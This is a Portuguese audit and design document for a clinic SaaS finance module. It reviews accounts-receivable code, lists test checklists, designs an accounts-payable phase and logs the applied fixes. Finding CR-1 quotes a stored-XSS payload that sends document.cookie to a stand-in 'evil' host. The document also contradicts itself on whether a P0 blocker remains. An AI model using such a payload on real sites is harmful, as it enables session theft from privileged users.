# AUDITORIA FASE 1 (CONTAS A RECEBER) + DESIGN FASE 2 (CONTAS A PAGAR)

> Documento de **auditoria e design** — nada implementado. Revisão crítica do
> código entregue na Fase 1 + checklist de homologação + prontidão + desenho da Fase 2.
> Data: 2026-06-18. Severidade: **P0** (bloqueador), **P1** (corrigir antes de produção),
> **P2** (melhoria), **P3** (cosmético).

---

# ETAPA 1 — AUDITORIA TÉCNICA

## 1.1 Banco de Dados

| ID | Sev | Achado | Detalhe / Risco |
|----|-----|--------|-----------------|
| DB-1 | **P1** | **Cancelamento NÃO libera o orçamento/contrato para nova receita** | O índice único parcial é `WHERE quoteId IS NOT NULL AND deletedAt IS NULL`. `cancelReceivable` seta `status=CANCELADO` mas **não** `deletedAt`. Logo um recebível cancelado continua ocupando o slot único do `quoteId`/`contractId` → **impossível refaturar** um orçamento após cancelar. Correção: índice `... AND status <> 'CANCELADO'` **ou** setar `deletedAt` no cancelamento. |
| DB-2 | **P1** | **Parcela de valor 0,00 trava o recebível em aberto** | `splitCents(total,count)` com `total < count` gera parcelas de 0 centavos (ex.: R$0,02 em 6x → quatro de 0,00). `recomputeInstallment` só marca PAGO quando `dueCents>0`; parcelas 0,00 ficam eternamente PENDENTE → `recomputeReceivable.allPaid` nunca true → recebível **nunca** chega a PAGO. Correção: validar `finalCents >= installmentsCount` (mín. 1 centavo/parcela) ou descartar parcelas zero. |
| DB-3 | **P2** | Falta índice `(companyId, createdAt)` em `financial_receivables` | A listagem ordena por `createdAt desc` filtrando `companyId`; hoje usa índice `(companyId,status)`/`(companyId,issueDate)` + sort. Sob volume, sort em memória. |
| DB-4 | **P2** | Sem CHECK de coerência `finalAmount = originalAmount - discountAmount` | Garantido só na aplicação. Como não há endpoint de edição na Fase 1, risco baixo, mas convém CHECK. |
| DB-5 | OK | Uso de `Decimal(12,2)` | Correto. Aritmética em centavos no serviço. ✔ |
| DB-6 | OK | FKs/constraints | `categoryId` Restrict, cascatas internas Cascade, CHECKs de não-negatividade e `paidAmount<=amount` presentes. ✔ |
| DB-7 | OK | Anti-duplicidade (concorrência) | Índice único parcial cobre a corrida do `findFirst`+`create` (2º cai em P2002→409). ✔ (mas ver DB-1) |

## 1.2 RLS

| ID | Sev | Achado |
|----|-----|--------|
| RLS-1 | **P1 (operacional)** | **Efetividade depende do role de conexão.** Se o role do Prisma tiver `BYPASSRLS` (comum no `postgres`/service do Supabase), o `FORCE` é ignorado e a RLS **não isola nada** — sobra só o filtro `companyId` da aplicação. Mitigação entregue: `financial-rls-check` detecta isso; **precisa ser rodado** e, se acusar bypass, usar role dedicado. |
| RLS-2 | **P1 (operacional)** | **Dependência de conexão de sessão.** `withFinanceTenant` usa `set_config(...,true)` dentro de `$transaction`. No *transaction pooler* (6543) os statements podem cair em conexões diferentes → GUC perdido → **fail-closed (0 linhas) em produção**. Exige porta 5432 ou *session pooler*. |
| RLS-3 | P2 | **Dependência excessiva da aplicação.** Tabelas vizinhas (patients/quotes/contracts) não têm RLS; o serviço financeiro as lê filtrando por `companyId` no código. Consistente com o resto do sistema, mas a RLS financeira é defesa parcial. |
| RLS-4 | OK | Sem políticas redundantes; `current_setting(...,true)` evita erro quando ausente (fail-closed). Vazamento entre empresas: **não** encontrado **se** RLS-1/RLS-2 estiverem corretos. |

## 1.3 Serviço Financeiro

| ID | Sev | Achado | Detalhe |
|----|-----|--------|---------|
| SVC-1 | **P1** | **`recebido` (KPI) conta pagamentos de recebíveis CANCELADOS** | `summary` soma `installmentPayment where reversedAt=null` sem excluir recebíveis cancelados, enquanto `faturado/emAberto` excluem CANCELADO. Inconsistência: cancelar um recebível com pagamento mantém o dinheiro no "Recebido". |
| SVC-2 | **P1** | **Cancelar não estorna pagamentos existentes** | `cancelReceivable` marca CANCELADO e cancela parcelas em aberto, mas pagamentos já feitos permanecem (não estornados). Estado semanticamente ambíguo. Política a definir: (a) bloquear cancelamento se houver pagamento não estornado; (b) estornar tudo automaticamente; (c) só permitir cancelar PENDENTE. **Recomendado: (a)/(c).** |
| SVC-3 | **P1** | **Corrida na baixa (sem lock de linha)** | `registerPayment` lê `paidAmount`, valida `paid+amount<=due` e cria pagamento **sem `SELECT ... FOR UPDATE`**. Duas baixas simultâneas na mesma parcela passam a pré-checagem; o `recompute` serializa no UPDATE e a 2ª viola o CHECK `paidAmount<=amount` → **rollback com erro 500** (seguro contra overpay, mas UX ruim e não retorna 400 amigável). Correção: travar a parcela no início (`FOR UPDATE`). |
| SVC-4 | P2 | **Validação de dinheiro fraca (Zod)** | O refine `Math.round(n*100)===Number((n*100).toFixed(0))` é quase sempre verdadeiro: aceita 3+ casas (ex.: `10.999`) e **arredonda silenciosamente** para 11,00. Trocar por checagem real de 2 casas. |
| SVC-5 | P2 | **Auditoria não é atômica com a operação** | `writeAudit` roda **após** o commit, com `prisma` global (best-effort). Uma operação crítica pode comitar sem log se o audit falhar. Para compliance, considerar auditar dentro da transação. |
| SVC-6 | P3 | Estorno é por **pagamento inteiro**, não por valor arbitrário | "Estorno parcial" = estornar um dos N pagamentos. Não há estorno de parte de um pagamento. Aceitável; documentar. |
| SVC-7 | OK | Geração de parcelas soma exata ao total (ajuste de centavos na última) ✔; baixa parcial/total e recálculo de status corretos ✔; transações atômicas via `$transaction` ✔. |

## 1.4 Frontend (fluxo real de clínica)

| ID | Sev | Achado |
|----|-----|--------|
| FE-1 | **P1 (UX)** | **Atrito para cobrança simples.** Só dá para criar recebível a partir de orçamento APROVADO/contrato ASSINADO. Cobrar uma consulta avulsa exige: criar orçamento no Clínico → aprovar → criar recebível (3 telas/papéis). Recepção não consegue "lançar uma cobrança" direta. |
| FE-2 | P2 | **Sem ações em lote** (baixar várias parcelas, cancelar em massa) — pesado para o financeiro no fechamento. |
| FE-3 | P2 | **Filtros pobres na lista:** sem busca por paciente, sem filtro por período/vencimento, sem filtro "vencidos" (a API aceita `overdue=1`, a UI não expõe), sem paginação (lista trava em `take:300`). KPIs não filtram por período. |
| FE-4 | P3 | Cancelamento/estorno usam `window.prompt`/`alert` (sem modal, sem validação rica). Recibo via `window.open`+`print` (bloqueio de pop-up; sem logo/CNPJ da clínica). |
| FE-5 | OK | Gating por capacidade no client ✔; valor default da baixa = saldo ✔; KPIs claros ✔. |

## 1.5 RBAC

| Papel | Hoje | Avaliação |
|-------|------|-----------|
| OWNER / MANAGER / FINANCE | total | ✔ correto |
| SUPER_ADMIN | total | ✔ (dono do SaaS) |
| RECEPTION | view/create/settle/receipt | ✔ conforme aprovado |
| **DOCTOR** | **view (tudo)** | **RBAC-1 (P2):** médico vê **todos** os recebíveis da clínica (financeiro de todos os pacientes) — possível superexposição/privacidade. Considerar `none` ou escopo "meus pacientes". |
| **ATTENDANCE** | none | ✔ (mas confirmar — atendimento não toca dinheiro) |
| MARKETING | none | ✔ |
| — | `delete`/`edit_paid` | **RBAC-2 (P3):** capacidades definidas mas **sem endpoint** que as use na Fase 1 (preparadas p/ futuro). Apenas registrar. |

---

## 1.6 CODE REVIEW — varredura completa do módulo (8 ângulos, alto recall)

Revisão independente de TODO o código financeiro (schema, migration, lib, rotas, frontend, scripts).
Achados **novos** (além de §1.1–§1.5), ordenados por severidade:

| ID | Sev | Arquivo:linha | Achado | Cenário de falha |
|----|-----|---------------|--------|------------------|
| **CR-1** | **P0 (segurança)** | `components/financial/receipt.ts:30-31,42` | **Stored XSS no recibo.** `r.patientName` e `r.description` são interpolados crus em HTML e injetados via `document.write` sem escapar. | Paciente cadastrado como `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` (ou descrição com `<script>`). Ao um OWNER/FINANCE clicar **Recibo**, o script roda na origem do app → roubo de sessão/token de usuário privilegiado. **Corrigir: escapar HTML de todos os campos interpolados.** |
| **CR-2** | **P1 (integridade)** | `lib/api/financial-service.ts:113-114` + `NewReceivableForm.tsx:66-67` | **Servidor confia no `originalAmount`/`discountAmount` enviados pelo client** em vez de derivar do orçamento/contrato. | Usuário com `create` (inclui RECEPTION) aprova um orçamento de R$100 e cria recebível de R$99.999 (ou de R$1). O vínculo com a origem vira cosmético; rastreabilidade/valor ficam decorrelacionados. **Corrigir: derivar `originalAmount` do `quote.total`/`contract.value` no servidor; desconto opcional limitado.** |
| **CR-3** | **P1 (concorrência)** | `financial-service.ts:188-201` (`registerPayment`) | **Baixa sem lock de linha** (`SELECT … FOR UPDATE`). | Duas baixas simultâneas na mesma parcela: sob READ COMMITTED ambas leem `paidAmount=0`, ambas inserem pagamento; cada `recompute` faz `paidAmount = própria_soma` (UPDATE sobrescreve, não soma) → ficam **2 pagamentos** somando 2× o valor, mas `paidAmount` mostra 1×. CHECK `paidAmount<=amount` **não** pega. Reconciliação (Σpagamentos ≠ paidAmount) quebra; possível cobrança em duplicidade. |
| **CR-4** | **P2** | `app/api/financeiro/receivables/route.ts:34-35` | **Filtro `overdue=1` aplicado em JS DEPOIS do `take:300`.** | Clínica com >300 recebíveis: vencidos antigos ficam fora das 300 mais recentes → `overdue=1` retorna **vazio/errado** mesmo havendo muitos vencidos. Também: `status` sem validação de enum (`as any`) → `?status=VENCIDO` lança no Prisma → 500. |
| **CR-5** | **P2** | `app/api/financeiro/summary/route.ts:16-24` | **`summary` materializa TODOS os recebíveis + parcelas em JS** (sem `aggregate`/paginação) — sendo que o próprio arquivo já usa `aggregate` para "recebido". | Dashboard de clínica com dezenas de milhares de parcelas transfere/serializa tudo por request → custo O(n) de I/O e memória; deveria ser ~3 `SUM`/`GROUP BY` SQL. |
| **CR-6** | **P3** | `migration.sql:115-116` | Índices únicos `quoteId_active`/`contractId_active` **sem `companyId`** (unicidade global, abaixo da RLS). | `quoteId` é cuid global (colisão improvável), mas a unicidade ideal é `[companyId, quoteId]` para não acoplar tenants nem produzir "duplicate key" abaixo da RLS. |
| **CR-7** | **P3** | `migration.sql:128` | FK `receivables.categoryId` → categorias **sem par `companyId`**; mesma-empresa garantida só na aplicação (`financial-service.ts:107-110`). | Qualquer escrita futura que pule a validação pode vincular categoria de outra empresa. Ideal: FK composta `(companyId, categoryId)`. |
| **CR-8** | **P3** | `financeiro/[id]/page.tsx:47,57` + `validations/financial.ts` | Motivo de cancelamento/estorno **só-espaços** (`' '`) passa no guard client (`!reason`) e no zod `.min(1)`. | Trilha de auditoria legal de cancelamento/estorno fica **em branco**. Corrigir: `reason.trim()` no client e `.trim().min(1)` no zod. |

**Refutados na verificação:** (a) "quote.total seria Decimal" em `sources/route.ts` — `ClinicalQuote.total` é `Float` → já é `number`; sem bug. (b) "`ALTER TYPE ADD VALUE` em transação quebra o deploy" — permitido no PG12+ (Supabase=PG15) pois os valores não são usados na mesma migration; precedente na migration de Telemedicina. **Validar no `migrate deploy`, mas risco baixo.**

**Gating RBAC confirmado NÃO-cosmético:** toda rota mutante chama `resolveFinanceUser(cap)` no servidor; o `financialCan` do client é só espelho. Capacidades `delete`/`edit_paid` existem no tipo mas **sem endpoint** (preparadas; não exploráveis).

> Pré-requisitos: migration aplicada (`prisma migrate deploy`), `financial-rls-check` verde, conexão de sessão (5432).

### A. Criação de recebível
- [ ] Criar a partir de **orçamento APROVADO** → 201, parcelas geradas.
- [ ] Criar a partir de **contrato ASSINADO** → 201.
- [ ] Orçamento **não aprovado** / contrato **não assinado** → erro claro.
- [ ] Origem de **outro paciente** → bloqueado.
- [ ] **Sem** orçamento e **sem** contrato → bloqueado (regra de origem obrigatória).
- [ ] Categoria de outra empresa → bloqueado.
- [ ] À vista (1x) e parcelado (ex.: 6x) — **Σ parcelas = total** (conferir centavos).
- [ ] **DB-2:** valor muito pequeno em muitas parcelas (R$0,02 em 6x) — verificar parcelas 0,00.
- [ ] Desconto > valor original → bloqueado.
- [ ] Valor com 3 casas (10.999) — verificar arredondamento (**SVC-4**).

### B. Anti-duplicação
- [ ] 2ª receita do **mesmo orçamento** → 409.
- [ ] 2ª receita do **mesmo contrato** → 409.
- [ ] Criação simultânea (corrida) do mesmo orçamento → só uma vence.
- [ ] **DB-1:** cancelar e tentar **refaturar** o mesmo orçamento → hoje bloqueado (verificar política desejada).

### C. Baixa (pagamento)
- [ ] Baixa **parcial** → parcela PARCIAL, recebível PARCIAL.
- [ ] Baixa que **quita** a parcela → PAGO; recebível PAGO quando todas pagas.
- [ ] Baixa **acima do saldo** → bloqueada.
- [ ] Baixa em parcela **já PAGA** / **cancelada** → bloqueada.
- [ ] Métodos: DINHEIRO/PIX/CARTÃO/TRANSFERÊNCIA/BOLETO/CHEQUE/OUTRO.
- [ ] **SVC-3:** duas baixas **simultâneas** na mesma parcela → comportamento (erro amigável vs 500).
- [ ] `paidAt` retroativo e futuro.

### D. Estorno
- [ ] Estorno de **um** pagamento (parcial) → parcela volta a PARCIAL.
- [ ] Estorno de **todos** os pagamentos (total) → parcela PENDENTE, `paidAt` limpo.
- [ ] Estorno de pagamento **já estornado** → 409.
- [ ] KPI **Recebido** reduz após estorno.

### E. Cancelamento
- [ ] Cancelar recebível **PENDENTE** → CANCELADO + parcelas canceladas.
- [ ] **SVC-2:** cancelar recebível **com pagamento** → verificar política (Recebido, parcelas pagas).
- [ ] Cancelar **já cancelado** → 409.
- [ ] **Motivo obrigatório**.

### F. Recibo
- [ ] Emitir recibo com pagamentos → soma só os **não estornados**.
- [ ] Recibo sem pagamento → indisponível/coerente.

### G. RBAC / Segurança
- [ ] RECEPTION: cria/baixa/recibo ✔; estorno/cancelamento → **403**.
- [ ] DOCTOR: view ✔; create → 403 (**RBAC-1**: avaliar se deve ver).
- [ ] MARKETING/ATTENDANCE: **403** em tudo.
- [ ] Usuário sem módulo habilitado / assinatura suspensa → 403.

### H. Multiempresa / RLS
- [ ] Usuário da empresa A **não vê** recebíveis de B (lista, detalhe, summary).
- [ ] **RLS-1:** `financial-rls-check` confirma isolamento e ausência de BYPASSRLS.
- [ ] **RLS-2:** validar com a string de conexão de produção (sessão, não pooler 6543).

### I. Auditoria
- [ ] CREATE, SETTLE, REVERSE, CANCEL gravados em `AuditLog` com usuário/data/IP.

### J. Não-regressão
- [ ] Módulos existentes (pacientes/clínico/CRM/agenda) **inalterados**.
- [ ] `/api/me` retorna `financeiro` no nível certo por papel.
- [ ] Menu "Financeiro" aparece/oculta por permissão+módulo.

---

# ETAPA 3 — PRONTIDÃO PARA A FASE 2

**1) A Fase 1 está pronta para produção?**
**Não.** A arquitetura, RBAC, auditoria, transações e `Decimal` estão sólidos, mas o code-review
revelou **1 P0 de segurança** (CR-1, XSS no recibo) e **integridade do valor** (CR-2). **Não fazer go-live**
sem corrigir P0 + P1.

**2) Existe bloqueador crítico (P0)?**
**Sim — 1:** **CR-1 (Stored XSS no recibo)**. É uma correção pequena (escapar HTML), mas é
bloqueador de produção por ser exploração de sessão contra usuário privilegiado. Não afeta a arquitetura.

**3) Dívida técnica obrigatória?**
Sim, antes de **produção** (não antes de *desenhar* a Fase 2): DB-1 (refaturar), DB-2 (parcela zero),
SVC-1 (KPI Recebido), SVC-2 (cancelar com pagamento), SVC-3 (lock na baixa), RLS-1/RLS-2 (verificação operacional).

**4) O que corrigir antes da Fase 2?**
**Nada bloqueia o *design* da Fase 2.** Os defeitos são específicos de Contas a Receber e **não** contaminam a
infra compartilhada (`withFinanceTenant`, RBAC, audit, RLS, Decimal, padrão de serviço) — que está saudável.
Recomendação: **corrigir P0+P1 em paralelo** ao desenvolvimento da Fase 2, com go-live conjunto.
Fila mínima pré-produção: **CR-1 (XSS), CR-2 (valor no client), CR-3 (lock na baixa), DB-1, DB-2, SVC-1, SVC-2** + operacionais **RLS-1/RLS-2**.

**5) Podemos iniciar a Fase 2 imediatamente?**
**Sim — o design e a construção da Fase 2 podem começar já.** O go-live (de ambas) aguarda P0+P1.

---

# ETAPA 4 — DESIGN TÉCNICO DA FASE 2 (CONTAS A PAGAR)

> Apenas desenho. Nada implementado. Reusa 100% da infra da Fase 1.

## 4.1 Princípio "sem retrabalho"
A Fase 2 nasce **simétrica** à Fase 1 para alimentar de graça as fases seguintes:
- **Fluxo de Caixa (Fase 5):** entradas (`InstallmentPayment`) e saídas (`PayablePayment`) compartilham o
  mesmo shape (`companyId`, `paidAt`, `amount`, `reversedAt`) → fluxo = Σentradas − Σsaídas por data, **sem schema novo**.
- **Centro de Custo (Fase 4) e DRE (Fase 11):** criar `CostCenter` e `ExpenseCategory` **já agora** (como
  `RevenueCategory` na Fase 1) → as fases futuras só **agregam**, sem migration.
- **Repasse Médico (Fase 8):** `Payable.professionalId?` (nulável) — o repasse é "uma despesa a um profissional",
  entra automaticamente no fluxo/DRE; Fase 8 só adiciona a **regra de cálculo** (%/fixo/híbrido).
- **Dashboard (Fase 6):** `/api/financeiro/summary` evolui para devolver entradas **e** saídas (extensível).

## 4.2 Entidades / Tabelas novas (todas `companyId` + `Decimal(12,2)` + RLS FORCE+GUC)

**`financial_suppliers` (`Supplier`)** — fornecedor (não existe hoje; criação genuína, sem duplicar).
`id, companyId, name, document?(CNPJ/CPF), email?, phone?, notes?, isActive, createdAt, updatedAt, deletedAt`
· `@@unique([companyId, name])` · índice parcial único em `document` (quando preenchido) · índice `(companyId)`.

**`financial_expense_categories` (`ExpenseCategory`)** — espelho de `RevenueCategory`.
Defaults: Marketing, Aluguel, Salários, Impostos, Infraestrutura, Fornecedores, Outros.

**`financial_cost_centers` (`CostCenter`)** — Fase 4 antecipada (Payable referencia).
Defaults: Administrativo, Comercial, Marketing, Clínica, Estética, Emagrecimento, Nutrologia.

**`financial_payables` (`Payable`)** — conta a pagar (cabeçalho).
`id, companyId, supplierId?, categoryId?(expense), costCenterId?, professionalId?(repasse, Fase 8),
description, originalAmount, discountAmount, finalAmount, status(PayableStatus), issueDate, dueDate,
notes, createdById, canceledAt?, canceledReason?, timestamps, deletedAt`.
- Decisão: **com ou sem parcelas?** Recomendo **espelhar recebíveis** (`Payable → PayableInstallment`) para
  unificar fluxo de caixa e suportar parcelamento de despesas; *ou* versão enxuta (1 vencimento) se preferir simplicidade.

**`financial_payable_payments` (`PayablePayment`)** — baixa de saída (idêntico a `InstallmentPayment`):
`amount, method, paidAt, notes, createdById, reversedAt?, reversedById?, reverseReason?`.

**Enums:** `PayableStatus` (PENDENTE/PARCIAL/PAGO/CANCELADO) — "vencido" derivado (mesma regra).
`EntityType += PAYABLE, PAYABLE_PAYMENT, SUPPLIER, EXPENSE_CATEGORY, COST_CENTER`. `PaymentMethod` reusado.

## 4.3 Relacionamentos
`Supplier 1—N Payable` (escalar) · `ExpenseCategory/CostCenter 1—N Payable` (Restrict) ·
`Payable 1—N PayablePayment` (Cascade) · `Payable.professionalId` escalar (sem @relation, padrão da base).
Nenhum `@relation` cruzando módulos.

## 4.4 RBAC (decisão a confirmar — difere de Receber)
Despesa é gestão/financeiro, não recepção. Proposta:
- OWNER/MANAGER/FINANCE/SUPER_ADMIN → total.
- **RECEPTION → `none`** (não vê/gerencia despesas). *(divergente de Contas a Receber — confirmar)*
- DOCTOR → `none` (ou `view` só de repasses próprios, na Fase 8).
- MARKETING/ATTENDANCE → `none`.
Capabilities espelhadas: `view/create/settle/receipt/reverse/cancel`; ações críticas auditadas.

## 4.5 APIs (mesmo padrão `resolveFinanceUser`+`withFinanceTenant`+`writeAudit`)
`/api/financeiro/suppliers` (GET/POST/[id]) · `/api/financeiro/expense-categories` (GET/POST) ·
`/api/financeiro/cost-centers` (GET/POST) · `/api/financeiro/payables` (GET/POST) ·
`/api/financeiro/payables/[id]` (GET) · `/payables/[id]/cancel` · `/payables/[id]/payments` (settle) ·
`/api/financeiro/payable-payments/[id]/reverse` · `summary` estendido (entradas+saídas).

## 4.6 Telas / Fluxo operacional
Reorganizar `/financeiro` em abas: **Receber · Pagar · Fluxo de Caixa**.
- **Pagar:** KPIs (a pagar, pago, vencido), lista filtrável (fornecedor/categoria/centro/vencimento), criar despesa.
- **Fornecedores:** CRUD simples.
- Fluxo operacional: cadastrar fornecedor → lançar despesa (categoria + centro de custo + vencimento) → baixa ao pagar.

## 4.7 Lições da Fase 1 a já incorporar na Fase 2 (evitar repetir P1)
- Travar linha na baixa (`FOR UPDATE`) — evita SVC-3.
- Política de cancelamento com pagamento definida desde já — evita SVC-2/SVC-1.
- Liberar refaturamento (índice `... AND status<>'CANCELADO'`) — evita DB-1.
- Validação de dinheiro forte (2 casas) e mín. 1 centavo/parcela — evita SVC-4/DB-2.
- Paginação + filtros desde o início — evita FE-3.

---

## RECOMENDAÇÃO FINAL

# ✅ GO FASE 2 (design + construção)

**Justificativa:** não há bloqueador P0; a infraestrutura compartilhada (multi-tenant/RLS, RBAC por
capacidade, auditoria, transações, `Decimal`, padrão de serviço) está sólida e foi validada por `tsc`+`build`.
Os defeitos encontrados são **P1 localizados em Contas a Receber** e **não contaminam** a Fase 2.

**Condição:** o **go-live de produção** (Fase 1 e 2) fica condicionado a:
1. Correção do **P0** CR-1 (XSS no recibo) e dos **P1**: CR-2, CR-3, DB-1, DB-2, SVC-1, SVC-2.
2. Verificação **operacional de RLS**: rodar `financial-rls-check` e garantir conexão de sessão (RLS-1/RLS-2).
3. Execução do checklist da Etapa 2.

Sugestão de sequência: **(a)** corrigir os P1 da Fase 1 (rápido, isolado) → **(b)** construir a Fase 2 →
**(c)** homologar e subir as duas juntas.

---

# EXECUÇÃO DA SEQUÊNCIA (2026-06-18)

## (a) Correções da Fase 1 — APLICADAS
| Achado | Correção |
|--------|----------|
| **CR-1** XSS | `receipt.ts`: `esc()` escapa todos os campos interpolados antes do `document.write`. |
| **CR-2** valor confiado | `createReceivable` agora **deriva** `originalAmount` de `quote.total`/`contract.value` (ignora o payload do cliente); `originalAmount` virou opcional no Zod; desconto validado contra o valor derivado. |
| **CR-3** corrida | `SELECT … FOR UPDATE` na parcela em `registerPayment`/`reversePayment` e no recebível em `cancelReceivable`. |
| **DB-1** refaturar | Índices únicos parciais agora incluem `AND status <> 'CANCELADO'`; dup-check do serviço idem. |
| **DB-2** parcela zero | Guard `finalCents >= installmentsCount` (mín. 1 centavo/parcela). |
| **SVC-1** KPI recebido | `summary` reescrito com **aggregates SQL** e exclui recebíveis cancelados de todos os KPIs. |
| **SVC-2** cancelar c/ pagamento | `cancelReceivable` bloqueia (409) se houver pagamento não estornado. |
| **CR-4** overdue | Filtro `overdue=1` empurrado para o **SQL** (parcela vencida em aberto); `status` validado contra o enum. |
| **CR-5** summary perf | Agora 4 agregações SQL (O(1) de transferência) em vez de materializar tudo. |
| **SVC-4** money | Refine de 2 casas decimais agora **rejeita** 3+ casas. |
| **CR-8** motivo | `trim().min(1)` no Zod de cancel/estorno + `trim()` no client. |

P3 aceitos como dívida (documentados): CR-6 (índice único sem companyId — cuid global), CR-7 (FK de categoria sem par companyId — validação na app).

## (b) Fase 2 — Contas a Pagar — IMPLEMENTADA
- **Migration** `20260618130000_add_financial_payables`: `financial_suppliers`, `financial_expense_categories`,
  `financial_cost_centers`, `financial_payables`, `financial_payable_payments` + enum `PayableStatus` + RLS FORCE+GUC + CHECKs + índices. **Pendente aplicar no Supabase.**
- **Schema**: models Supplier/ExpenseCategory/CostCenter/Payable/PayablePayment; `Payable.professionalId?` (gancho Repasse Fase 8); `EntityType` += PAYABLE/PAYABLE_PAYMENT/SUPPLIER/EXPENSE_CATEGORY/COST_CENTER.
- **Backend**: `payable-access.ts` (`resolvePayableUser`, RBAC RECEPTION=sem acesso), `payable-service.ts` (criar, baixa c/ FOR UPDATE, estorno, cancelar-bloqueado-se-pago, recompute, seed catálogos, serialize), validações; APIs `suppliers`, `expense-categories`, `cost-centers`, `payables` (+`[id]`, `cancel`, `payments`), `payable-payments/[id]/reverse`, `payables/summary`.
- **Frontend**: abas **Receber · Pagar** (`FinanceTabs`), `/financeiro/pagar` (KPIs + lista + nova despesa + fornecedor rápido), `/financeiro/pagar/[id]` (baixa/estorno/cancel). Gating por `payableCan`.
- **Lições da Fase 1 já incorporadas:** FOR UPDATE na baixa, valor coerente, escape, validações fortes, cancelar só sem pagamento, status validado.

## (c) Validação
- `tsc --noEmit` ✓ · `next build` ✓ (exit 0; todas as rotas Receber+Pagar como λ dinâmicas).
- Testes: `npm run financial-smoke`, `npm run financial-payables-smoke`, `npm run financial-rls-check` (exigem DB+server+service role — não executados sem DB).

### Homologação adicional — Fase 2 (Contas a Pagar)
- [ ] Criar fornecedor; nome duplicado → 409.
- [ ] Criar despesa com/sem fornecedor, categoria e centro de custo; desconto > valor → bloqueado.
- [ ] Baixa parcial → PARCIAL; total → PAGO; acima do saldo → bloqueada.
- [ ] Estorno → recalcula status; estornar já estornado → 409.
- [ ] Cancelar com pagamento → 409; sem pagamento → CANCELADO.
- [ ] **RBAC:** RECEPTION/DOCTOR/MARKETING/ATTENDANCE → **403** em todo Contas a Pagar; aba "Pagar" oculta.
- [ ] OWNER/MANAGER/FINANCE → acesso total.
- [ ] Multiempresa/RLS nas 5 tabelas novas (rodar `financial-rls-check` cobre o padrão).
- [ ] Auditoria CREATE/SETTLE/REVERSE/CANCEL para PAYABLE/SUPPLIER.
- [ ] KPIs de Pagar (a pagar/pago/vencido) coerentes.

## Estado final
**Fase 1 (corrigida) + Fase 2 (Contas a Pagar) prontas em código.** Go-live conjunto após:
**(1)** aplicar as 2 migrations no Supabase (`migrate deploy`); **(2)** `financial-rls-check` verde + conexão de sessão;
**(3)** executar a homologação (Etapa 2 + Fase 2 acima).
